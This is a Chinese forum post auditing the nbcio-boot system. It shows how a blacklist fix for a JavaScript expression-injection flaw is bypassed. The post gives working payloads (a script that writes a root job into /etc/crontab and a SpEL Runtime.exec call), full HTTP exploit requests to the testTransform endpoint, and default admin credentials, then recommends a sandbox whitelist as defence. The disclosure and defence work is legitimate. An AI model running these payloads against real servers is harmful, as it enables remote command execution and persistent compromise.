---
title: nbcio-boot代码审计之JS注入攻守道
url: https://forum.butian.net/share/4109
source: 奇安信攻防社区
date: 2025-02-08
fetch_date: 2025-10-06T20:33:58.031003
---

# nbcio-boot代码审计之JS注入攻守道

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### nbcio-boot代码审计之JS注入攻守道

* [漏洞分析](https://forum.butian.net/topic/48)

一、项目地址
https://gitee.com/nbacheng/nbcio-boot.git
默认账号密码为：admin/123456
二、漏洞简介
该系统存在一个JavaScript表达式注入漏洞，本人此前公开披露过此漏洞，于是该系统进行了...

### 一、项目地址
<https://gitee.com/nbacheng/nbcio-boot.git>
默认账号密码为：admin/123456
### 二、漏洞简介
该系统存在一个JavaScript表达式注入漏洞，本人此前公开披露过此漏洞，于是该系统进行了第一次修复，但是经过进一步审计发现本次修复仍然可以通过构造特殊POC对防御点进行绕过。
### 三、漏洞分析
#### 1、初始漏洞
本人此前向奇安信投过稿件，文章中分析了初始漏洞的形成与利用。
稿件地址：<https://forum.butian.net/share/3698>
#### 2、初始漏洞的修复
通过对比发现，系统对java.lang.Runtime等关键类进行了黑名单过滤，在返回的engine容器中不再包含这些类，所以不能再使用这些类中的方法去执行系统命令。
系统修复痕迹：<https://gitee.com/nbacheng/nbcio-boot/blob/master/nbcio-module-estar/src/main/java/com/nbcio/modules/estar/bs/service/impl/DataSetParamServiceImpl.java>
![image-20241031193524953](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-a529263fb7eadd26c065ce25caf6665eb60285af.jpeg)
如果我们仍然使用原来的POC去攻击则不会产生任何效果。
![image-20241214234506495](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-0708b38ac7b2cfee254583c23052f56b81f40870.jpeg)
#### 3、漏洞绕过思路
此处提供两个思路。
第一个思路是利用文件写入触发命令执行。
虽然系统中已经限制关于命令执行类的直接调用，但想要执行系统命令并不局限于直接调用命令执行函数这个方式。比如我们可以调用文件操作类向系统中写入特定文件从而间接造成命令执行。
POC:
dnslog域名请替换成自己的，可以去dnslog.cn在线申请。
```js
var File=Java.type(\\"java.io.File\\");
var file=new File(\\"/etc/crontab\\");
var FileWriter=Java.type(\\"java.io.FileWriter\\");\\
var fw=new FileWriter(file);
var BufferedWriter=Java.type(\\"java.io.BufferedWriter\\");
var bw=new BufferedWriter(fw);
var str=\\"\\* \\* \\* \\* \\* root ping p5.\\*\\*\\*\\*\\*.top\\";
bw.write(str);bw.flush();bw.close();
```
POC解析：根据javascript语法调用java类，实例化File对象，目的在于向/etc/crontab文件中写入定时任务命令。
发送请求
![image-20241225003003801](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-b26a0c49afd816eaba320a1a843e6f140826af91.jpeg)
请求包：
注意命令后\\ \\n是换行，不添加这个会导致命令失效。
```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: 192.168.64.131:8081
Content-Length: 627
Accept: application/json, text/plain, \\*/\\*
X-TIMESTAMP: 20240808213818
X-Sign: ED5C3621799AA3EAC6D2ABAB498B1DCD
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMxMzU3MDAsInVzZXJuYW1lIjoiYWRtaW4ifQ.t5je51OW1Q40U-8d0HudQCXQc-WXQbP7o9cmvKjsO3Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://218.75.87.38:9888
Referer: http://218.75.87.38:9888/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
​
{"sourceCode":"mysql","dynSentence":"select \\* from bs\\_report\\_barstack","dataSetParamDtoList":\[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"var File=Java.type(\\"java.io.File\\");var file=new File(\\"/etc/crontab\\");var FileWriter=Java.type(\\"java.io.FileWriter\\");var fw=new FileWriter(file);var BufferedWriter=Java.type(\\"java.io.BufferedWriter\\");var bw=new BufferedWriter(fw);var str=\\"\\* \\* \\* \\* \\* root ping p1.\\*\\*\\*\\*\\*.top\\\\n\\";bw.write(str);bw.flush();bw.close();"}\],"dataSetTransformDtoList":\[{"transformType":"js","transformScript":""}\],"setType":"sql"}
```
查看/etc/crontab文件，可以看到命令被成功写入。
![image-20241225003144870](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-c9e0d99745557eee0d29929ed3e280136adab86b.jpeg)
访问dnslog监测平台，监听到目标服务器的dnslog解析请求，证明命令被成功执行。
![image-20241225003338657](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-0e566d9913209328c2787b3d88df13d282934b1b.jpeg)
第二思路是利用调用外部容器去实现命令执行。
我们考虑到系统对java类的调用限制仅局限于当前的javascript容器中，如果我们间接的调用其它可以进行命令执行的容器是不是就能实现绕过了呢？比如间接调用SPEL组件去解析表达式，因为sprinboot框架中默认包含SPEL组件，所以这个设想存在较大可行性。
基本逻辑如下：
![image-20241031195758581](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-353e1adfffe6f85432be3b954ea927c3d390e6f1.jpeg)
漏洞验证
事实证明上述逻辑是可行的，继续调用/bs/bsDataSet/testTransform接口，在注入POC后仍然可以执行系统命令,弹出计算器。
POC:
```js
var A=Java.type(\\"org.springframework.expression.spel.standard.SpelExpressionParser\\");
var B=new A;
var C=B.parseExpression(\\"T(java.lang.Runtime).getRuntime().exec('\\*\\*\\*\\*')\\");
var D=C.getValue();
```
本地测试
系统执行了calc命令，成功弹出计算器。
![image-20241031195929927](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-900dcd9baf9a8dd6cdcbb47413e6313a3ca6b1bb.jpeg)
远程测试
发送包含DNSLog请求的POC
![image-20241225004620009](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-44d5719d9a4c882db6ecb44a38a981243a7ae1d2.jpeg)
请求包：
```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: 192.168.64.131:8081
Content-Length: 513
Accept: application/json, text/plain, \\*/\\*
X-TIMESTAMP: 20240808213818
X-Sign: ED5C3621799AA3EAC6D2ABAB498B1DCD
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMxMzU3MDAsInVzZXJuYW1lIjoiYWRtaW4ifQ.t5je51OW1Q40U-8d0HudQCXQc-WXQbP7o9cmvKjsO3Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://218.75.87.38:9888
Referer: http://218.75.87.38:9888/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
​
{"sourceCode":"mysql","dynSentence":"select \\* from bs\\_report\\_barstack","dataSetParamDtoList":\[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"var A=Java.type(\\"org.springframework.expression.spel.standard.SpelExpressionParser\\");var B=new A;var C=B.parseExpression(\\"T(java.lang.Runtime).getRuntime().exec('ping p5.\\*\\*\\*\\*\\*.top')\\");var D=C.getValue();"}\],"dataSetTransformDtoList":\[{"transformType":"js","transformScript":""}\],"setType":"sql"}
```
DNSLog平台成功监听到DNSlog解析请求，证明命令成功被执行,POC有效。
![image-20241225004851676](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-def3e480d57ddd1d604878abdfeccdd5a6aca0b8.jpeg)
### 四、防御策略
通过上述分析可知，该系统的防御策略存在的最大问题在于使用了黑名单进行防御，因此防御面较为有限，所以我们应该考虑使用白名单进行防御。我们在综合考虑之后决定使用\*\*NashornSandbox\*\*沙箱来实现这一策略。
参考链接：
[https://blog.csdn.net/gitblog\\_00274/article/details/142838510](https://blog.csdn.net/gitblog\_00274/article/details/142838510)
[https://gitcode.com/gh\\_mirrors/de/delight-nashorn-sandbox/overview?utm\\_source=artical\\_gitcode&amp;index=top&amp;type=card&amp;&amp;isLogin=1](https://gitcode.com/gh\_mirrors/de/delight-nashorn-sandbox/overview?utm\_source=artical\_gitcode&index=top&type=card&&isLogin=1)
在调用未在白名单中的类时系统会报错。
![image-20241225012826825](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-4e4f0f2e0c20106df47e80ed22c3e489099ef62e.jpeg)
但是可以正常运行其它常规js语句。
![image-20241225013029056](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-9c6966cf47f6cb09d8b3b24180adb3986fac0f7c.jpeg)
结合项目实际，我们只需要向系统中添加一行代码即可实现较为完整的防御。（此处不能说完全是因为还涉及死循环、DOS攻击等漏洞，具体配置可进一步查阅资料。）
![image-20241225014802045](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-0d47badf0a357add2b8fcaedde9329efb32bdd94.jpeg)
再次访问系统，命令不再执行，证明防御有效。
![image-20241225015004125](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-0bd0a77354e8fcd80c8c26ceae371cf150ca780a.jpeg)
漏洞攻防分析到此结束，不足之处请多指教。

* 发表于 2025-02-07 10:00:00
* 阅读 ( 3449 )
* 分类：[代码审计](https://forum.butian.net/community/code%20audit)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butia...